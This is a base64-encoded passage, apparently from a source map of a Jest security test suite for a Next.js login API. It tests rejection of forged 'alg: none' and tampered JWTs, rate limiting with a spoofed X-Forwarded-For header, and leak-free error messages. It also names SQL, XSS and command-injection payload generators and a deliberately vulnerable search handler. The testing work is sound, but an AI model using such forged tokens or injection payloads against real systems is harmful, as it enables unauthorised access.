mUnLCB0eXA6ICdKV1QnIH0pKS50b1N0cmluZygnYmFzZTY0dXJsJyk7XG4gICAgICBjb25zdCBwYXlsb2FkID0gQnVmZmVyLmZyb20oSlNPTi5zdHJpbmdpZnkoeyB1c2VySWQ6IDEsIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScgfSkpLnRvU3RyaW5nKCdiYXNlNjR1cmwnKTtcbiAgICAgIGNvbnN0IG5vbmVUb2tlbiA9IGAke2hlYWRlcn0uJHtwYXlsb2FkfS5gO1xuICAgICAgXG4gICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICBqd3QudmVyaWZ5KG5vbmVUb2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgfSkudG9UaHJvdygpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCB2YWxpZGF0ZSB0b2tlbiBzaWduYXR1cmUnLCAoKSA9PiB7XG4gICAgICBjb25zdCB2YWxpZFRva2VuID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVWYWxpZEpXVCh7IHVzZXJJZDogMSB9KTtcbiAgICAgIGNvbnN0IFtoZWFkZXIsIHBheWxvYWRdID0gdmFsaWRUb2tlbi5zcGxpdCgnLicpO1xuICAgICAgY29uc3QgdGFtcGVyZWRUb2tlbiA9IGAke2hlYWRlcn0uJHtwYXlsb2FkfS50YW1wZXJlZF9zaWduYXR1cmVgO1xuICAgICAgXG4gICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICBqd3QudmVyaWZ5KHRhbXBlcmVkVG9rZW4sIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQhKTtcbiAgICAgIH0pLnRvVGhyb3coJ2ludmFsaWQgc2lnbmF0dXJlJyk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdSYXRlIExpbWl0aW5nIFNpbXVsYXRpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBoYW5kbGUgcmFwaWQgc3VjY2Vzc2l2ZSByZXF1ZXN0cycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHJlcXVlc3RzID0gQXJyYXkuZnJvbSh7IGxlbmd0aDogMTAwIH0sICgpID0+IFxuICAgICAgICBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBib2R5OiB7XG4gICAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgICAgJ1gtRm9yd2FyZGVkLUZvcic6ICcxOTIuMTY4LjEuMTAwJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9KVxuICAgICAgKTtcblxuICAgICAgLy8gSW4gYSByZWFsIGltcGxlbWVudGF0aW9uLCB0aGlzIHdvdWxkIHRyaWdnZXIgcmF0ZSBsaW1pdGluZ1xuICAgICAgY29uc3QgcmVzcG9uc2VzID0gYXdhaXQgUHJvbWlzZS5hbGwoXG4gICAgICAgIHJlcXVlc3RzLm1hcChyZXEgPT4gc2VjdXJlQXV0aEhhbmRsZXIocmVxKSlcbiAgICAgICk7XG5cbiAgICAgIC8vIEFsbCByZXF1ZXN0cyBzaG91bGQgYmUgcHJvY2Vzc2VkIChpbiByZWFsIGFwcCwgc29tZSB3b3VsZCBiZSByYXRlIGxpbWl0ZWQpXG4gICAgICByZXNwb25zZXMuZm9yRWFjaChyZXNwb25zZSA9PiB7XG4gICAgICAgIGV4cGVjdChbNDAwLCA0MDEsIDQyOV0pLnRvQ29udGFpbihyZXNwb25zZS5zdGF0dXMpOyAvLyA0MjkgPSBUb28gTWFueSBSZXF1ZXN0c1xuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdFcnJvciBIYW5kbGluZyBTZWN1cml0eScsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIG5vdCBleHBvc2Ugc2Vuc2l0aXZlIGluZm9ybWF0aW9uIGluIGVycm9yIG1lc3NhZ2VzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgLy8gU2ltdWxhdGUgZGF0YWJhc2UgZXJyb3JcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tSZWplY3RlZFZhbHVlKG5ldyBFcnJvcignQ29ubmVjdGlvbiBmYWlsZWQgdG8gZGF0YWJhc2UgXCJtZF9zcG9ydHNcIiBvbiBob3N0IFwibG9jYWxob3N0XCInKSk7XG4gICAgICBcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgIFxuICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg1MDApO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLnRvQmUoJ0ludGVybmFsIHNlcnZlciBlcnJvcicpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ2RhdGFiYXNlJyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbignbG9jYWxob3N0Jyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbignbWRfc3BvcnRzJyk7XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHVzZSBnZW5lcmljIGVycm9yIG1lc3NhZ2VzIGZvciBhdXRoZW50aWNhdGlvbiBmYWlsdXJlcycsIGFzeW5jICgpID0+IHtcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tSZXNvbHZlZFZhbHVlKG51bGwpO1xuICAgICAgXG4gICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6ICdub25leGlzdGVudEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgXG4gICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMSk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikudG9CZSgnSW52YWxpZCBjcmVkZW50aWFscycpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ3VzZXIgbm90IGZvdW5kJyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbignZW1haWwnKTtcbiAgICB9KTtcbiAgfSk7XG59KTsiXSwibmFtZXMiOlsiY3JlYXRlTW9ja05leHRSZXF1ZXN0IiwidXJsIiwib3B0aW9ucyIsIm1ldGhvZCIsImJvZHkiLCJoZWFkZXJzIiwiSGVhZGVycyIsImpzb24iLCJKU09OIiwicGFyc2UiLCJ0ZXh0Iiwic3RyaW5naWZ5IiwiU2VjdXJpdHlUZXN0VXRpbHMiLCJnZW5lcmF0ZVNRTEluamVjdGlvblBheWxvYWRzIiwiZ2VuZXJhdGVYU1NQYXlsb2FkcyIsImdlbmVyYXRlQ29tbWFuZEluamVjdGlvblBheWxvYWRzIiwiZ2VuZXJhdGVMb25nU3RyaW5ncyIsInJlcGVhdCIsImdlbmVyYXRlSW52YWxpZFRva2VucyIsImhhc2hQYXNzd29yZCIsInBhc3N3b3JkIiwiYmNyeXB0IiwiaGFzaCIsImdlbmVyYXRlVmFsaWRKV1QiLCJwYXlsb2FkIiwic2VjcmV0Iiwiand0Iiwic2lnbiIsImV4cGlyZXNJbiIsImdlbmVyYXRlRXhwaXJlZEpXVCIsIm1vY2tQcmlzbWEiLCJ1c2VyIiwiZmluZFVuaXF1ZSIsImplc3QiLCJmbiIsImZpbmRNYW55IiwiY3JlYXRlIiwidXBkYXRlIiwicHJvZHVjdCIsIiRxdWVyeVJhdyIsIiRleGVjdXRlUmF3IiwidnVsbmVyYWJsZVNlYXJjaEhhbmRsZXIiLCJyZXEiLCJVUkwiLCJxdWVyeSIsInNlYXJjaFBhcmFtcyIsImdldCIsIk5leHRSZXNwb25zZSIsImVycm9yIiwic3RhdHVzIiwicmVzdWx0cyIsInNlY3VyZVNlYXJjaEhhbmRsZXIiLCJsZW5ndGgiLCJzYW5pdGl6ZWRRdWVyeSIsInJlcGxhY2UiLCJ3aGVyZSIsIm5hbWUiLCJjb250YWlucyIsIm1vZGUiLCJzZWN1cmVBdXRoSGFuZGxlciIsImVtYWlsIiwiY2xpZW50SVAiLCJlbWFpbFJlZ2V4IiwidGVzdCIsInN1c3BpY2lvdXNQYXR0ZXJucyIsImlzU3VzcGljaW91cyIsInNvbWUiLCJwYXR0ZXJuIiwiUHJvbWlzZSIsInJlc29sdmUiLCJzZXRUaW1lb3V0IiwiaXNWYWxpZCIsImNvbXBhcmUiLCJ0b2tlbiIsInVzZXJJZCIsImlkIiwiaWF0IiwiTWF0aCIsImZsb29yIiwiRGF0ZSIsIm5vdyIsInByb2Nlc3MiLCJlbnYiLCJKV1RfU0VDUkVUIiwiaXNzdWVyIiwiYXVkaWVuY2UiLCJkZXNjcmliZSIsImJlZm9yZUFsbCIsImJlZm9yZUVhY2giLCJjbGVhckFsbE1vY2tzIiwiaXQiLCJzcWxQYXlsb2FkcyIsInJlcXVlc3QiLCJlbmNvZGVVUklDb21wb25lbnQiLCJyZXNwb25zZSIsImV4cGVjdCIsIm5vdCIsInRvQmUiLCJkYXRhIiwidG9IYXZlUHJvcGVydHkiLCJtb2NrUmVzb2x2ZWRWYWx1ZSIsInRvSGF2ZUJlZW5DYWxsZWRXaXRoIiwieHNzUGF5bG9hZHMiLCJyZXNwb25zZVN0ciIsInRvTWF0Y2giLCJpbnZhbGlkVG9rZW5zIiwidmVyaWZ5IiwidG9UaHJvdyIsImV4cGlyZWRUb2tlbiIsImlzSW52YWxpZCIsInZhbGlkRW1haWwiLCJpbnZhbGlkRW1haWwiLCJtb2NrSW1wbGVtZW50YXRpb24iLCJ2YWxpZFJlcXVlc3QiLCJpbnZhbGlkUmVxdWVzdCIsInN0YXJ0MSIsInJlc3BvbnNlMSIsInRpbWUxIiwic3RhcnQyIiwicmVzcG9uc2UyIiwidGltZTIiLCJhYnMiLCJ0b0JlTGVzc1RoYW4iLCJsb25nU3RyaW5ncyIsImxvbmdTdHJpbmciLCJpbnZhbGlkRW1haWxzIiwibWFsaWNpb3VzSW5wdXRzIiwiaW5wdXQiLCJjb21tYW5kUGF5bG9hZHMiLCJpc1ZhbGlkRmlsZU5hbWUiLCJmaWxlbmFtZSIsImRlY29kZWQiLCJ0b0JlRGVmaW5lZCIsImV4cCIsImhlYWRlciIsIkJ1ZmZlciIsImZyb20iLCJhbGciLCJ0eXAiLCJ0b1N0cmluZyIsIm5vbmVUb2tlbiIsInZhbGlkVG9rZW4iLCJzcGxpdCIsInRhbXBlcmVkVG9rZW4iLCJyZXF1ZXN0cyIsIkFycmF5IiwicmVzcG9uc2VzIiwiYWxsIiwibWFwIiwiZm9yRWFjaCIsInRvQ29udGFpbiIsIm1vY2tSZWplY3RlZFZhbHVlIiwiRXJyb3IiXSwibWFwcGluZ3MiOiI7Ozs7eUJBQXNFO3dCQUN6QztxRUFDYjtpRUFDRzs7Ozs7O0FBR25CLDZDQUE2QztBQUM3QyxNQUFNQSx3QkFBd0IsQ0FBQ0MsS0FBYUMsVUFJeEMsQ0FBQyxDQUFDO0lBQ0osTUFBT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